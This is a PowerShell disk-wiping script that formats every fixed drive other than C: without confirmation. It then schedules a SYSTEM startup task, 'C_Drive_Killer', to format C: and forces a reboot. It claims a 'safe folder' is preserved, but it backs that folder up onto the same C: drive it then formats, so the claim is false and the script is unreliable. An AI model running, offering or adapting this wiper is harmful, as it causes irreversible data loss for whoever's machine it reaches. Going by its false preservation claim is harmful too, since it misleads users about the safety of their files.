<#
.SYNOPSIS
Total Drive Annihilation - Permanent Data Destruction with Safe Folder Exclusion
#>

# ===== CONFIG =====
$WipePasses = 1  # Set to 3 for DoD 5220.22-M compliance (slower)
$SafeFolder = "C:\Users"  # Folder (and subfolders) to exclude from deletion

$NonC_Drives = Get-Partition | Where-Object { 
    $_.DriveLetter -and 
    $_.DriveLetter -ne 'C' -and 
    (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
} | Select-Object -ExpandProperty DriveLetter

# ===== FUNCTIONS =====
function Invoke-TotalWipe {
    param([string]$DriveLetter)
    try {
        # Full format with zero overwrite (quick but thorough)
        Write-Host "[!] NUKE INITIATED ON DRIVE $DriveLetter"
        Format-Volume -DriveLetter $DriveLetter -FileSystem NTFS -Force -Confirm:$false -NumberOfPasses $WipePasses
        Write-Host "[✓] DRIVE $DriveLetter ERASED" -ForegroundColor Green
    } catch {
        Write-Host "[X] FAILED TO WIPE $DriveLetter : $_" -ForegroundColor Red
    }
}

function Protect-SafeFolder {
    # Create protection marker in safe folder
    $markerPath = Join-Path $SafeFolder "DO_NOT_DELETE_SAFE_FOLDER"
    if (-not (Test-Path $SafeFolder)) {
        New-Item -ItemType Directory -Path $SafeFolder -Force | Out-Null
    }
    Set-Content -Path $markerPath -Value "This folder is protected from deletion" -Force
}

# ===== MAIN EXECUTION =====
Write-Host "=== TOTAL DATA ANNIHILATION ===" -ForegroundColor Red
Write-Host "SAFE FOLDER: $SafeFolder (and subfolders) will be preserved" -ForegroundColor Yellow

# Create protection in safe folder
Protect-SafeFolder

# ---- PHASE 1: DESTROY NON-C DRIVES ----
foreach ($Drive in $NonC_Drives) {
    Invoke-TotalWipe -DriveLetter $Drive
}

# ---- PHASE 2: SCHEDULE C: DESTRUCTION ----
if (Get-Partition -DriveLetter 'C' -ErrorAction SilentlyContinue) {
    Write-Host "[!] PREPARING C: DRIVE EXECUTION" -ForegroundColor Yellow

    # Create a suicide script for C: (runs at startup)
    $KillScript = @"
@echo off

:: Preserve safe folder during C: wipe
set "SAFE_FOLDER=$SafeFolder"

timeout /t 5 > nul
echo PRESERVING SAFE FOLDER: %SAFE_FOLDER%

:: Create temp location for safe folder
set TEMP_SAFE=%SystemDrive%\TEMP_SAFE_%RANDOM%
mkdir "%TEMP_SAFE%"

:: Backup safe folder
robocopy "%SAFE_FOLDER%" "%TEMP_SAFE%" /E /COPYALL /MOVE /R:1 /W:1 > nul

:: Wipe C: drive
echo WIPING C: DRIVE...
format C: /FS:NTFS /P:$WipePasses /Y > nul

:: Restore safe folder
mkdir "%SAFE_FOLDER%"
robocopy "%TEMP_SAFE%" "%SAFE_FOLDER%" /E /COPYALL /MOVE > nul
rd /s /q "%TEMP_SAFE%"

shutdown /s /t 0
"@
    $ScriptPath = "$env:Temp\killc.cmd"
    $KillScript | Out-File -FilePath $ScriptPath -Force -Encoding ascii

    # Schedule it to run at next boot
    schtasks /create /tn "C_Drive_Killer" /tr "$ScriptPath" /sc ONSTART /ru SYSTEM /f | Out-Null

    # ---- PHASE 3: FORCE RESTART ----
    Write-Host "[!] REBOOTING TO FINISH C: DRIVE..." -ForegroundColor Magenta
    Write-Host "[!] SAFE FOLDER WILL BE PRESERVED: $SafeFolder" -ForegroundColor Cyan
    Restart-Computer -Force
}

# ---- FINAL MESSAGE (only seen if C: wipe fails) ----
Write-Host @"

=== MISSION COMPLETE ===
- All non-C drives: ERASED
- C: drive: SCHEDULED FOR DESTRUCTION ON REBOOT
- Safe folder preserved: $SafeFolder
- System will SHUT DOWN after C: is wiped

(╯°□°)╯︵ ┻━┻  GOODBYE!
"@ -ForegroundColor Cyan